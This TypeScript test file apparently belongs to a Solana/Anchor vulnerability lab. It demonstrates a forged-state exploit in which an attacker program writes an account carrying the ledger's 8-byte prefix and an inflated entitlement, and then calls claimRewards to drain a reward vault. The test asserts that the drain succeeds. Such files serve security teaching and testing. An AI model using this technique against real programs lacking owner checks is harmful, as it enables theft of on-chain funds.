/**
 * VULN 03 — Forged state: ledger parsed from an UncheckedAccount.
 *
 * claim_rewards reads the "ledger" from raw bytes and only checks an
 * 8-byte prefix. A discriminator is public data, not authentication:
 * the attacker program forges an account with the same prefix and an
 * arbitrary entitlement, then drains the reward vault.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, nativeIx, sendTx, sendSelfSigned,
  TOKEN_PROGRAM_ID, SystemProgram, BN,
} from "./util";

const LEDGER_PREFIX = Buffer.from([0x4c, 0x45, 0x44, 0x47, 0x45, 0x52, 0x30, 0x31]);

describe("vuln03 forged state account", () => {
  const program = anchorProgram("vuln03_forged_state", PROG_IDS.vuln03);
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln03)[0];

  let mint: any, victim: any, attacker: any;
  let attackerAta: any, victimLedger: any, forgedAccount: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    await program.methods.initialize().accounts({ mint }).rpc();

    // Reward vault is funded with 1000 tokens.
    await mintTo(provider.connection, provider.wallet.payer, mint, vaultPda, provider.wallet.publicKey, 1000);

    victimLedger = findPda([seedsBuf("ledger")[0], victim.publicKey.toBytes()], PROG_IDS.vuln03)[0];
    await program.methods
      .recordRewards(new BN(100))
      .accounts({ ledger: victimLedger, user: victim.publicKey })
      .signers([victim])
      .rpc();
  });

  it("honest ledger says the victim earned 100", async () => {
    // Layout: 8-byte anchor discriminator | 32-byte owner | u64 amount
    const raw = await provider.connection.getAccountInfo(victimLedger);
    assert.isNotNull(raw);
    const amount = raw!.data.readBigUInt64LE(40);
    assert.equal(amount.toString(), "100");
  });

  it("attacker forges a ledger with a huge entitlement and drains the vault", async () => {
    // mode 1 of the attacker program: create an account owned by the
    // attacker program and write arbitrary bytes into it.
    const entitlement = 1000n; // exactly the vault balance, read off-chain
    const amt = Buffer.alloc(8);
    amt.writeBigUInt64LE(entitlement);
    const payload = Buffer.concat([LEDGER_PREFIX, amt]);
    forgedAccount = findPda([seedsBuf("forge")[0], payload.slice(0, 8)], PROG_IDS.attacker)[0];

    await sendTx(
      [
        nativeIx(
          PROG_IDS.attacker, 1, payload,
          [
            { pubkey: forgedAccount, isSigner: false, isWritable: true },
            { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        ),
      ],
      [attacker],
    );

    // The forged account passes the "discriminator" check: same 8 bytes.
    // (No signature from the ledger owner is required — there is no check.)
    await sendSelfSigned(
      [
        await program.methods
          .claimRewards(new BN(1000))
          .accounts({
            ledger: forgedAccount, // BUG: no owner check
            user: attacker.publicKey,
            destinationAta: attackerAta,
            vault: vaultPda,
          })
          .instruction(),
      ],
      attacker,
    );

    assert.equal((await tokenBalance(attackerAta)).toString(), "1000");
    assert.equal((await tokenBalance(vaultPda)).toString(), "0");
  });
});
